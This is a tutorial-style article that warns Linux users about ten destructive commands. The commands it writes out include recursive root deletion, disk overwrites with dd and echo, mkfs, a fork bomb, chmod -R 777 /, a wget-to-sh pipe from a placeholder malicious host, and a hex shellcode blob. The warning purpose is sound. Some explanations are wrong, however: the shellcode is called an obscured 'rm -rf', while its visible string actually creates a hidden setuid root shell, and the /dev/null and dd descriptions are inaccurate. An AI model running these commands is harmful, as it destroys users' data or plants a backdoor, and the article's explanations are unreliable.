# 10 Destructive Linux Commands You Should Never Run

> What are the most dangerous Linux commands?

I have been asked this question numerous times and I have avoided answering that because there is no definite list of dangerous Linux commands.

You have the tools that enable you to control and modify every aspect of your operating system. I am not trying to scare you but if you are unfamiliar with the commands and tools, you can screw up your system pretty easily.

Imagine the scenario of a young child in a household. There are numerous ways the kid can hurt herself. But does this mean the child should not be allowed outside the crib? That would be damaging to her growth.

This is where parents set boundaries and guide the child. Don’t go near the fire. Don’t poke your fingers in the power outlets. As the child grows and gains experience, she can turn the stove on, make a fire in the fireplace and plug in the power cables.

Similarly, if you are aware of a few known risky commands, you may avoid falling into the traps of trolls trying to trick you into running commands and messing up your system.

As you gain experience and know the meaning and usages of the commands and tools, less will be the chances of destroying your system with silly and tricky commands.

# Commands
## Wipe-out everything on root without formating
```bash
sudo rm -rf /*
```
This one probably is the most infamous command circling in all kinds of social media. You’ll often find trolls commenting this in various discussions.

The command rm is used to remove files/directories. The flags -r and -f are used to denote recursive removal of all files inside the specified directory. Now, without root privilege, this command won’t do any harm.

Running the command sudo rm -rf / also will not create any issues as most distributions provide a failsafe option. You need to specify –no-preserve-root with it to actually run it.

## Overwrite your current partition
```bash
echo "Hello" > /dev/sda1
```
This will overwrite everything on `/dev/sda1`.

## Move everything into a void
```bash
mv /home/user/*  /dev/null
```
No root needed, as you move files **from** your homedir.
There is a void inside every Linux system. And that void is `/dev/null`

Whatever you throw into this area is lost forever. Also, it reports the writing process as a success after discarding the data, which is the main reason for its destructiveness.

## Format your drive
```bash
sudo mkfs.ext3 /dev/sda
```
The command does its job and you end up with a messed up system beyond recovery. Meaning: you will not be able to boot your OS properly.

## Fork bomb
```bash
:(){:|:&};:
```
`&` – Shell Background Operator. It informs the shell to put the command in the background. Here, it defines a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. This process keeps on executing again and again till the system freezes due to using up all available resources ( cpu & ram ).

As the name suggests, the fork bomb forks itself and eventually becomes a chain bomb and eats up all the system resources. You’ll be forced to reboot the system, which is not as bad as the other commands in this list.

## Overwrite important config files
```bash
command > /etc/config_filename
```
Now, if you use some important configuration file as the place to write data, it will replace the content, leaving a broken system.

## Replace current partition with garbase/random data
```bash
dd if=/dev/urandom of=/dev/sda
cat /dev/urandom > filename
```
dd command is used as a low-level copying tool. Here, it takes random data from /dev/random and replaces the partition /dev/sda with this garbage.
Second command generates **random data** and inserts it into filename. If not terminated with Ctrl + C, the file can occupy a considerable amount of space, which may be disastrous for low-end systems.

## Expose you filesystem to everyone
```bash
(sudo) chmod -R 777 /
```
The root file system is not accessible to other users without privileges. While this ensures a private and secure system, you can upside down this system with one single command.
The above command exposes all files on the root partition to everyone. What it means is that everyone using the system has read, write, and execution permission. This is not good for your system.

## Download (and run) malicious content
How do you install software in Linux? You use the official package manager or ready to use packages as Deb/RPM, Snap. Flatpak etc.
However, some software are not packaged and their developers provide shell scripts to download and run. Take homebrew for example.
You download a shell file and run it as root to install a software in your system. Do you see the problem with it?
While it works with official software like Homebrew, you should double check the content of the shell script you are downloading before running it directly like this:
```bash
wget http://malicious_source -O- | sh
```
Such commands will download and run malicious scripts in your system, which can have serious consequences like data being stolen due to leak........

## Disquised commands
There are many ways you can run commands in a Linux terminal. One such way is the hex-coded commands.
```bash
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```
While it looks fancy, this is a coded/obscured version of `rm -rf` command. It does the same effect as running the previous command. So, while copying and pasting such fancy commands from the internet, be cautious.